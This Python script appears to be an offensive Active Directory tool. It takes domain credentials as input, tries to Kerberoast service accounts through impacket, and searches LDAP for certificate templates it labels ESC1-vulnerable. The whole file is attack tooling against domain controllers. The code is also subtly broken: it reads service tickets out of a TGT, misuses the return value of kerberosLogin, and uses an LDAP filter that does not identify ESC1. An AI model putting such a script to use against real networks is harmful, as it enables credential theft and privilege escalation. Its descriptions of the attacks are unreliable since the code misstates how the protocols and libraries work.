from impacket.krb5.asn1 import AP_REQ
from impacket.krb5.types import Principal
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.smbconnection import SMBConnection
from ldap3 import Server, Connection, ALL_ATTRIBUTES, ALL

def kerberos_auth(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via SMB
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain)

        # Perform Kerberos authentication
        _, krbtgt_ticket = smb.kerberosLogin(username, password, domain)
        smb.logoff()

        return krbtgt_ticket

    except Exception as e:
        print(f"Error during Kerberos authentication: {e}")
        return None

def kerberoast(domain, username, password, dc_ip):
    try:
        print(f"Attempting to Kerberoast accounts from {dc_ip}")

        # Get TGT ticket for the specified user
        krbtgt_ticket = kerberos_auth(username, password, domain, dc_ip)

        if krbtgt_ticket:
            print("Successfully obtained krbtgt ticket.")
            
            # Extract usernames of kerberoastable accounts from the TGT
            kerberoastable_accounts = extract_kerberoastable_accounts(krbtgt_ticket)
            if kerberoastable_accounts:
                print("Kerberoastable Accounts:")
                for account in kerberoastable_accounts:
                    print(account)
            else:
                print("No kerberoastable accounts found.")
        else:
            print("Failed to obtain krbtgt ticket.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

def extract_kerberoastable_accounts(tgt):
    try:
        kerberoastable_accounts = []

        for ticket in tgt['enc-part']['cipher'].tickets:
            sname = str(ticket['sname'])
            if sname.startswith('service'):
                service_name = sname.split('/')[1].split('@')[0]
                kerberoastable_accounts.append(service_name)

        return kerberoastable_accounts

    except Exception as e:
        print(f"Error while extracting kerberoastable accounts: {e}")
        return []

def check_esc1_vulnerability(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller LDAP
        server = Server(dc_ip, get_info=ALL_ATTRIBUTES)
        conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication='NTLM', auto_bind=True)

        # Search for vulnerable certificate templates
        conn.search(search_base='CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' + ','.join(f"DC={dc}" for dc in domain.split('.')),
                    search_filter='(&(objectClass=pKICertificateTemplate)(msPKI-Certificate-Template-OID=1.3.6.1.4.1.311.21.8.*))',
                    attributes=['cn'])

        results = conn.entries
        conn.unbind()

        if results:
            print("Vulnerable Certificate Templates (ESC1):")
            for result in results:
                print(result.cn)
        else:
            print("No vulnerable certificate templates found.")

    except Exception as e:
        print(f"Error while searching for ESC1 certificate templates: {e}")


# Example usage:
username = input("Enter username: ")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")

kerberoast(domain, username, password, dc_ip)
check_esc1_vulnerability(username, password, domain, dc_ip)
